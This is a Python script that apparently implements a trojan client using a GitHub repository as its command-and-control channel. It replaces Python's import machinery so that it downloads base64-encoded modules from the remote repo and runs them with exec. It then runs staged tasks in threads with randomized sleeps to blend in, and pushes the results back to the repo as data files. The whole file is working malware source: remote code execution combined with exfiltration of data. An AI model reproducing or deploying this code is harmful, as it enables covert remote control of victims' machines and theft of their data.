#!/usr/bin/env python3

import sys
from base64 import b64decode, b64encode
from importlib import util
from random import randint
from json import loads
from time import time, sleep 
from threading import Thread
from queue import Queue
from datetime import datetime
from github3 import login


def connect_to_github():
    with open('git_stuff.txt', 'r') as f:
        git_info = eval(f.read())
    gh = login(username=git_info['user'], token=git_info['token']) 
    repo = gh.repository(git_info['user'], git_info['repo_name'])
    return repo

def get_file_contents(filepath):
    repo = connect_to_github()
    branch = repo.branch("main")
    tree = branch.commit.commit.tree.to_tree().recurse()
    
    for filename in tree.tree:      
        if filepath in filename.path:
            print(f"[+] Found file {filepath}")
            blob = repo.blob(filename._json_data["sha"])
            return blob.content
        
class GitImporter(object):
    def __init__(self):
        self.current_module_code = ""
    
    def find_module(self, fullname, path=None):
        print(f"[&] Attempting to retrieve {fullname}")
        new_library = get_file_contents(f"modules/{fullname}")         
        if new_library:
            self.current_module_code = b64decode(new_library)        
            return self

    def load_module(self, name):
        repo = connect_to_github()
        spec = util.spec_from_loader(name, loader=None, origin=repo.git_url)
        mod = util.module_from_spec(spec)
        exec(self.current_module_code, mod.__dict__)
        sys.modules[spec.name] = mod
        return mod

class ClientHandler:

    def __init__(self,) -> None:
        self.client_id = None
        self.repo = connect_to_github()
        self.task_queue = Queue()
        self.config_path = f'config/{self.client_id}.json'
        self.data_path = f'data/{self.client_id}'

    def get_client_config(self):
        config_json = get_file_contents(self.config_path)
        if config_json == None:
            configuration = [{'module':'stage_1'}]
        else:
            configuration = loads(b64decode(config_json))
        for tasks in configuration:
            if tasks['module'] not in sys.modules:
                exec(f"import {tasks['module']}")
        return configuration
         
    def module_queue(self, module):
        self.task_queue.put(1)
        result = sys.modules[module].run()
        self.task_queue.get()
        return result

    def create_client_config(self, module):
        self.client_id = f'ent-{int(time())}'
        self.config_path = f'config/{self.client_id}.json'
        self.data_path = f'data/{self.client_id}'
        result = self.module_queue(module)
        message = f'{self.client_id} init {datetime.now().isoformat()}' 
        bindata = bytes(r'%s' %result, 'utf-8')
        self.repo.create_file(self.config_path, message, bindata)
    
    def module_runner(self, module):
        result = self.module_queue(module)
        message = f'{module}__{datetime.now().isoformat()}'
        data_path_full = f'{self.data_path}/{int(time())}.data'
        bindata = bytes('%r' %result, 'utf-8')
        self.repo.create_file(data_path_full, message, b64encode(bindata))
    
    def update_client_config(self, module):
        result = self.module_queue(module)
        message = f'{self.client_id} update {datetime.now().isoformat()}' 
        bindata = bytes(r'%s' %result, 'utf-8')
        self.repo.file_contents(self.config_path).update(message,bindata)

def main():
    sys.meta_path = [GitImporter()]
    client = ClientHandler()
    module_list = [] 
    while True:
        if client.task_queue.empty():
            config = client.get_client_config()
            for task in config:
                if task['module'] in module_list and task['module'] != 'sleep':
                    continue
                else:
                    module_list.append(task['module'])
                    if task['module'] == 'stage_1':
                        t = Thread(target=client.create_client_config, args=(task['module'],))
                        t.start()
                        sleep(randint(3,6))
                    elif task['module'] == 'stage_2':
                        t = Thread(target=client.update_client_config, args=(task['module'],))
                        t.start()
                        sleep(randint(5,10))
                    else:
                        t = Thread(target=client.module_runner, args=(task['module'],))
                        t.start()
                        sleep(randint(5,10))

if __name__=='__main__':
    main()
